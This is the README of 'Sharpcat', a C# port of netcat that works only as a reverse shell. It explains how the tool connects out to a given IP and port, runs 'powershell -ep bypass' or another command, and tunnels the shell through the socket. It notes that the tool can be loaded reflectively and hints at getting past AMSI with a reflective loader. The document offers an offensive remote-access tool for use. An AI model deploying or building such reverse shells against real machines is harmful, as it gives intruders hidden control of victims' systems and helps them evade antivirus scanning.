# Sharpcat

A port of classic netcat to C#

This is my first attempt at writing C# stuff, so if you thing this code is bad, I am open to constructive improvement suggestions.

This is a reverse shell only netcat and as it is written in C#, it can be loaded reflectively.
It is based on the netcat windows code and I ported the do_exec.c file to C# as best as I could.

You can call Sharpcat in a few different ways:

+ `Sharpcat`, no parameters, use the default IP address, port number and command (`powershell -ep bypass`)
+ `Sharpcat IPaddress Port`, make a reverse connection to IPaddress and port, run the `powershell -ep bypass` as shell
+ `Sharpcat IPadress Port "command with parameters"`, make a reverse connection to IPaddress and port, run the command (e.g. "cmd.exe")

The bulk of it all is in Exec.cs, it is a shameless port of the do_exec.c from netcat. The command will be started as a sub process,
with stdin, stdout and stderr redirected through a pipe to Sharpcat. Sharpcat will then tunnel the pipe through the network socket to the
remote end. This remote end could be a netcat or something else.

Not much more to it. If you want to bypass AMSI and other stuff, you can use a Powershell based reflective loader (left as an exercise for
the reader).

That is more or less it...

TheArt42
